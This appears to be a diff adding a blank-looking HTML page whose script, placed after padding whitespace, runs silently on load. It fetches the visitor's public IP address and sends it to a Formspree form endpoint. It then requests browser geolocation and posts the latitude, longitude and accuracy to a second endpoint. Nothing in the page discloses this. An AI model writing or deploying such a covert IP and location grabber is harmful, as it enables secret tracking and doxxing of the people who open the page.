@@ -1,0 +1,67 @@
+<html>
+<head><title>фвы</title></head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+<script>
+
+function getIP(json) {
+  var ip = json.ip;
+
+  sendEmail(ip);
+}
+
+
+function sendEmail(ip) {
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://formspree.io/f/manwwqab', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({ ip: ip }));
+}
+
+
+fetch('https://api.ipify.org?format=json')
+ .then(response => response.json())
+ .then(getIP);
+
+
+// Получаем доступ к геолокации
+navigator.geolocation.getCurrentPosition(position => {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const accuracy = position.coords.accuracy;
+
+  
+  sendLocationEmail(latitude, longitude, accuracy);
+});
+
+
+function sendLocationEmail(latitude, longitude, accuracy) {
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://formspree.io/f/xldrrgap', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({
+    latitude: latitude,
+    longitude: longitude,
+    accuracy: accuracy
+  }));
+}
+
+
+</script>  
+</body>
+</html>
